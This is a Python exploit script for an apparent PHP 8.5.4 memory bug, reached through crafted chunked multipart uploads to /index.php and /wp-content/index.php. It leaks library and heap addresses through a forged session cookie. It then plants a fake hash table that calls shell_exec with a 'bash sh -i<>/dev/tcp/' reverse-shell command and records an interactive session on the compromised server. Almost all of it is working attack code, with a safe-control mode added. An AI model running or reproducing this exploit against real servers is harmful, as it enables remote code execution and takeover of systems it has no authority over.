#!/usr/bin/env python3
"""Remote-only PHP8.5.4 A1/B1 address leak -> 109618 reverse shell."""
import argparse,hashlib,ipaddress,json,os,socket,struct,time
from pathlib import Path
from urllib.parse import unquote_to_bytes
import remote_exploit as remote

HERE=Path(__file__).resolve().parent
EV=HERE/'stock-cwd-fanchor-evidence'/'b1-1792849868-20769'
A1=EV/'a1.body.bin';B1=EV/'b1.body.bin'
A1_SHA='86eca256db7159dbe0d18f85f587a1e729d378dd9d1e6feb5f568261a856b48a'
B1_SHA='5d5c54544b7884e3dd54ef787acb7a0ffc6d19080d47cf32e7be03eddbee41c7'
A_BOUNDARY=b'q618-cookie-a1-boundary';B_BOUNDARY=b'q618-cookie-b1-boundary';T_BOUNDARY=b'q618-cookie-terminal-boundary'
DTOR_OFF=0x74c6f0;SHELL_OFF=0x535400;BACKING_OFF=0x63140;PAGEOFF=0x50
COOKIE_LEN=0x200;TABLE_COUNT=7
FILLERS=905;MAX_RESPONSE=2*1024*1024
def sha(x):return hashlib.sha256(x).hexdigest()
def status(raw):return raw.split(b'\r\n',1)[0].decode('latin1','replace') if raw else ''
def chunked(host,port,path,body_path,boundary,cookie,head_path,timeout=300):
    head=(f'POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\nContent-Type: multipart/form-data; boundary={boundary.decode()}\r\nCookie: PHPSESSID={cookie}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n').encode();head_path.write_bytes(head)
    out=bytearray();complete=False;error=None
    try:
        with socket.create_connection((host,port),timeout=timeout) as s:
            s.settimeout(timeout);s.sendall(head)
            with body_path.open('rb') as f:
                while True:
                    b=f.read(65536)
                    if not b:break
                    s.sendall(f'{len(b):x}\r\n'.encode()+b+b'\r\n')
            s.sendall(b'0\r\n\r\n');complete=True
            while len(out)<MAX_RESPONSE:
                b=s.recv(min(65536,MAX_RESPONSE-len(out)))
                if not b:break
                out.extend(b)
    except (OSError,TimeoutError) as e:error=f'{type(e).__name__}: {e}'
    return bytes(out),complete,error
def get_cookie(raw):
    for line in raw.split(b'\r\n\r\n',1)[0].split(b'\r\n'):
        marker=b'PHPSESSID=';off=line.find(marker)
        if line.lower().startswith(b'set-cookie:') and off>=0:
            wire=line[off+len(marker):].split(b';',1)[0]
            return wire,unquote_to_bytes(wire.decode('latin1'))
    raise remote.core.ExploitStopped('forged Set-Cookie absent')
def derive(cookie):
    if len(cookie)!=COOKIE_LEN or not cookie.startswith(b'/B1TAG!!'):
        raise remote.core.ExploitStopped(f'cookie shape length={len(cookie)}')
    tables=[]
    for i in range(TABLE_COUNT):
        fields=struct.unpack_from('<IIIIQIIIIqQ',cookie,PAGEOFF+i*56)
        if fields[:4]!=(1,7,20,0xfffffffe) or fields[5:10]!=(1,1,8,0,1):
            raise remote.core.ExploitStopped('HashTable leak shape')
        tables.append(fields)
    destructors={x[10] for x in tables};mains={x[4]&~0x1fffff for x in tables}
    if len(destructors)!=1 or len(mains)!=1:raise remote.core.ExploitStopped('address ambiguity')
    dtor=next(iter(destructors));lib=dtor-DTOR_OFF;main=next(iter(mains))
    if lib&0x1fffff or main&0x1fffff:raise remote.core.ExploitStopped('address alignment')
    return main,lib,dtor,[x[4] for x in tables]
def make_seed(backing,zif,command,safe=False):
    command=command.encode()
    if len(command)>39:raise remote.core.ExploitStopped('callback command exceeds39B')
    seed=bytearray(b'Q'*295);ht=0x80-0x18;fakeht=backing+0x80;fakestr=backing+0xe0
    struct.pack_into('<QIIQQ',seed,0x60-0x18,fakeht,1 if safe else 0x307,0,0,0)
    struct.pack_into('<IIIIQIIIIQQ',seed,ht,1,7,0x10,0xfffffff0,fakeht,1,0,8,0,1<<32,zif)
    seed[ht+0x38:ht+0x50]=b'\0'*0x18;struct.pack_into('<QII',seed,ht+0x50,fakestr,0x106,0)
    st=0xe0-0x18;struct.pack_into('<IIQQ',seed,st,1,6,0,len(command));seed[st+0x18:st+0x18+len(command)]=command;seed[st+0x18+len(command)]=0
    return bytes(seed)
def part(headers,body=b''):return b'--'+T_BOUNDARY+b'\r\n'+headers+b'\r\n\r\n'+body+b'\r\n'
def terminal(seed):
    chunks=[part(b'Content-Disposition: form-data; name=""',seed),part(b'Content-Disposition: form-data; name="a"',b'1')];suffix=b'[a]'*58
    for i in range(FILLERS):
        chunks.append(part(b'Content-Disposition: form-data; name="files['+str(i).encode()+b']'+suffix+b'"; filename=""\r\nContent-Type: application/octet-stream'))
    chunks.append(part(b'Content-Disposition: form-data; name="'+b'A'*(700*1024)+b'[k]"',b'x'));chunks.append(b'--'+T_BOUNDARY+b'--\r\n');return b''.join(chunks)
def save_response(out,label,raw,complete,error):
    (out/f'{label}.response.raw').write_bytes(raw)
    return {'status':status(raw),'bytes':len(raw),'sha256':sha(raw),'complete':complete,'error':error}
class AllWorkerSelector:
    def __init__(self,host,port,release_index):
        self.host=host;self.port=port;self.release_index=release_index;self.sockets=[]
    def __enter__(self):
        try:
            for _ in range(5):
                holder=socket.create_connection((self.host,self.port),timeout=10)
                holder.settimeout(10);holder.sendall(b'G');self.sockets.append(holder);time.sleep(.15)
            time.sleep(.5);self.sockets[self.release_index].close();self.sockets[self.release_index]=None;time.sleep(.5)
            return self
        except Exception:
            self.__exit__()
            raise
    def evidence(self):
        return {'strategy':'five partial request lines; release one indexed worker','total_workers_assumed':5,'holders_started':5,'release_index':self.release_index,'holders_remaining':sum(x is not None for x in self.sockets),'php_request_started_before_release':False}
    def __exit__(self,*_):
        for holder in self.sockets:
            if holder is not None:
                try:holder.close()
                except OSError:pass
def main():
    p=argparse.ArgumentParser();p.add_argument('target');p.add_argument('callback');p.add_argument('--safe-control',action='store_true');p.add_argument('--release-index',type=int,default=0);a=p.parse_args()
    host,port=remote.core.split_endpoint(a.target,80,'target');callback_host,callback_port=remote.core.split_endpoint(a.callback,None,'callback')
    remote.core.HOST_HEADER=host
    if not(1<=callback_port<=9):raise remote.core.ExploitStopped('callback port must be1..9')
    if not(0<=a.release_index<5):raise remote.core.ExploitStopped('release index must be0..4')
    if sha(A1.read_bytes())!=A1_SHA or sha(B1.read_bytes())!=B1_SHA:raise remote.core.ExploitStopped('frozen body drift')
    command=f"bash -c 'sh -i<>/dev/tcp/{int(ipaddress.ip_address(callback_host))}/{callback_port}'"
    root=remote.output_root()/(('remote-cookie-control-' if a.safe_control else 'remote-cookie-shell-')+f'{int(time.time())}-{os.getpid()}');root.mkdir(mode=0o700,parents=True)
    receipt={'status':'STARTED','target':f'{host}:{port}','callback':f'{callback_host}:{callback_port}','callback_peer_scope':'exact target host','safe_control':a.safe_control,'target_profile':'php854-stock-cwd-prefork5-fanchor','target_state_used':False,'target_management_requests':0,'target_process_identity_known':False,'total_workers_assumed':5,'release_index':a.release_index,'a1_sha256':A1_SHA,'b1_sha256':B1_SHA,'cookie_length':COOKIE_LEN,'hash_table_count':TABLE_COUNT,'hash_table_offset':PAGEOFF,'terminal_backing_offset':BACKING_OFF};rp=root/'receipt.json';remote.write_json(rp,receipt)
    listener=None;final=None
    try:
        listener=remote.core.open_listener(callback_host,callback_port)
        with AllWorkerSelector(host,port,a.release_index) as selector:
            receipt['selector']=selector.evidence();remote.write_json(rp,receipt)
            ar,ac,ae=chunked(host,port,'/index.php',A1,A_BOUNDARY,'%00',root/'a1.request-head.raw');receipt['a1']=save_response(root,'a1',ar,ac,ae)
            if not ac or ae is not None:raise remote.core.ExploitStopped(f'A1 transport incomplete: {ae}')
            if not (ar.startswith(b'HTTP/1.0 500') or ar.startswith(b'HTTP/1.1 500')):raise remote.core.ExploitStopped('A1 did not OOM')
            br,bc,be=chunked(host,port,'/wp-content/index.php',B1,B_BOUNDARY,'a',root/'b1.request-head.raw');receipt['b1']=save_response(root,'b1',br,bc,be)
            if not bc or be is not None:raise remote.core.ExploitStopped(f'B1 transport incomplete: {be}')
            if not (br.startswith(b'HTTP/1.0 200') or br.startswith(b'HTTP/1.1 200')):raise remote.core.ExploitStopped(f'B1 status {status(br)}')
            wire,decoded=get_cookie(br);(root/'b1.cookie.bin').write_bytes(decoded);main_base,libphp,dtor,ar_data=derive(decoded)
            receipt['http_leak']={'wire_len':len(wire),'decoded_len':len(decoded),'decoded_sha256':sha(decoded),'main':f'0x{main_base:x}','libphp':f'0x{libphp:x}','zval_ptr_dtor':f'0x{dtor:x}','arData':[f'0x{x:x}' for x in ar_data]}
            prime=remote.request_once(host,port,'GET','/index.php',accept=False);remote.save_exchange(root,'prime','GET','/index.php',port,prime);receipt['prime']={'status':prime.status,'bytes':len(prime.body),'location':prime.headers.get('location')}
            if prime.status not in (200,301,302,500):raise remote.core.ExploitStopped(f'prime status {prime.status}')
            backing=main_base+BACKING_OFF;positive_seed=make_seed(backing,libphp+SHELL_OFF,command,False);seed=make_seed(backing,libphp+SHELL_OFF,command,a.safe_control)
            delta=[i for i,(positive,actual) in enumerate(zip(positive_seed,seed)) if positive!=actual]
            if a.safe_control and delta!=[80,81]:raise remote.core.ExploitStopped(f'safe seed delta drift {delta}')
            body=terminal(seed);(root/'terminal.seed.bin').write_bytes(seed);(root/'terminal.body.bin').write_bytes(body)
            final=remote.core.PersistentHTTP(host,port,timeout=60,connection_header='close');final.send('POST','/index.php',body=body,content_type=f'multipart/form-data; boundary={T_BOUNDARY.decode()}',read_response=False);(root/'terminal.request.raw').write_bytes(final.last_request_head+body)
            receipt['terminal']={'seed_sha256':sha(seed),'body_sha256':sha(body),'body_bytes':len(body),'backing':f'0x{backing:x}','zif_shell_exec':f'0x{libphp+SHELL_OFF:x}','command':command,'bucket_type':'IS_NULL' if a.safe_control else 'IS_ARRAY_EX','request_complete':True,'safe_control_delta':{'offsets':[80,81],'positive_hex':'0703','control_hex':'0100'} if a.safe_control else None};remote.write_json(rp,receipt)
            shell,peer=remote.core.accept_target(listener,host,5 if a.safe_control else 60)
            if a.safe_control:
                if shell:shell.close();raise remote.core.ExploitStopped('safe control received callback')
                health=remote.request_once(host,port,'GET','/wp-content/index.php',accept=False);remote.save_exchange(root,'safe-health','GET','/wp-content/index.php',port,health)
                receipt['safe_health']={'status':health.status,'bytes':len(health.body)}
                if health.status!=200:raise remote.core.ExploitStopped(f'safe control health status {health.status}')
                receipt.update({'status':'SAFE_CONTROL_PASS','callbacks':0});remote.write_json(rp,receipt);print(f'safe control pass receipt {rp}',flush=True);return 0
            if shell is None:raise remote.core.ExploitStopped('no callback')
            print(f'reverse shell {peer[0]}:{peer[1]}',flush=True);shell.sendall(b'exec 1>&0 2>&0\n');transcript=root/'session.raw';transcript.touch(mode=0o600);receipt.update({'status':'CONNECTED_INTERACTIVE_REVERSE_SHELL','peer':f'{peer[0]}:{peer[1]}','transcript':str(transcript),'exit_command_sent':False});remote.write_json(rp,receipt)
            try:
                with transcript.open('ab',buffering=0) as stream:why=remote.core.interactive_shell(shell,stream)
            finally:shell.close()
            data=transcript.read_bytes();receipt.update({'status':'INTERACTIVE_REVERSE_SHELL','disconnect_reason':why,'transcript_bytes':len(data),'transcript_sha256':sha(data)});remote.write_json(rp,receipt);print(f'receipt {rp}',flush=True);return 0
    except Exception as e:
        receipt.update({'status':'STOPPED','error':f'{type(e).__name__}: {e}'});remote.write_json(rp,receipt);raise
    finally:
        if final:final.close()
        if listener:listener.close()
if __name__=='__main__':
    try:raise SystemExit(main())
    except (remote.core.ExploitStopped,OSError,ValueError,KeyError,json.JSONDecodeError) as e:print(f'stopped: {e}',file=__import__('sys').stderr);raise SystemExit(1)
